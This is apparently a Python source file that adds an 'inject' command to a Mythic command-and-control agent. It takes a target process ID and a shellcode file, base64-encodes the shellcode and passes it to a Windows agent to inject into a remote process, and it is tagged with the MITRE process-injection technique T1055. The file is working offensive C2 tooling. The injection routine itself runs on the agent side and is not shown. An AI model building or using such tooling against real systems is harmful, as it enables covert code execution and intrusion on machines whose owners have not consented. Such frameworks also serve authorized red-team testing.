from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import base64


class InjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                type=ParameterType.Number,
                description="Target process ID",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
            CommandParameter(
                name="shellcode_file",
                type=ParameterType.File,
                description="Shellcode file to inject",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Require JSON arguments.\n\tUsage: {}".format(InjectCommand.help_cmd))


class InjectCommand(CommandBase):
    cmd = "inject"
    needs_admin = False
    help_cmd = "inject -pid <PID> -shellcode_file <shellcode.bin>"
    description = "Inject shellcode into a remote process"
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1055"]
    argument_class = InjectArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )
        file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=taskData.args.get_arg("shellcode_file"),
        ))
        if not file_content.Success:
            response.Success = False
            response.Error = f"Failed to get shellcode: {file_content.Error}"
            return response
        taskData.args.add_arg("shellcode_data", base64.b64encode(file_content.Content).decode(), ParameterType.String)
        pid = taskData.args.get_arg("pid")
        response.DisplayParams = f"PID {pid} ({len(file_content.Content)} bytes)"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
